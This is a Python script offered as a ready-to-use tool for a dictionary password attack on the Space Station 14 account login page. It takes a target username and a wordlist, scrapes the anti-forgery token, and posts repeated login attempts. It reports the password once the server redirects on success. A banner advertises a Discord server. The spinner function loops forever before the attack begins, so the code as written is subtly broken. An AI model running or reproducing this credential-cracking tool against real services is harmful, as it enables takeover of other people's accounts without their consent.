import requests
from bs4 import BeautifulSoup
import shutil
import sys
import time

art = r"""
  __                       _   
 / _| ___  _ __ __ _  ___ | |_ 
| |_ / _ \| '__/ _` |/ _ \| __|
|  _| (_) | | | (_| | (_) | |_ 
|_|  \___/|_|  \__, |\___/ \__|
               |___/           

https://discord.gg/5z9hdquRfF

"""

width = shutil.get_terminal_size().columns
for line in art.splitlines():
    print(line.center(width))
    
def animation():
    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    while True:
        sys.stdout.write(f"\r{frames[i]} Scan...")
        sys.stdout.flush()
        time.sleep(0.1)
        i = (i + 1) % len(frames)


def main():
    try:
        ckey = input("CKEY: ")
        path = input("FULL PATH TO DICT: ")
        
        session = requests.Session()
        
        animation()

        with open(path) as f:
            for password in f:
                password = password.strip()

                login_page = session.get("https://account.spacestation14.com/Identity/Account/Login")
                soup = BeautifulSoup(login_page.text, 'html.parser')
                token = soup.find('input', {'name': '__RequestVerificationToken'})['value']

                login_data = {
                    "Input.EmailOrUsername": ckey, 
                    "Input.Password": password, 
                    "Input.RememberMe": "false",
                    "__RequestVerificationToken": token
                }

                response = session.post(
                    "https://account.spacestation14.com/Identity/Account/Login",
                    data=login_data,
                    allow_redirects=False
                )
                
                if response.status_code == 302 and "Location" in response.headers:
                    if response.headers["Location"].endswith("/"):
                        print(f"✅ SUCCESS!!!! PASSWORD: {password}")
                        return
    except FileNotFoundError:
        print("DICT NOT FOUND")
    except Exception as e:
        print(f"ERROR: {str(e)}")
    except KeyboardInterrupt:
        print("\nok")

if __name__ == '__main__': 
    main()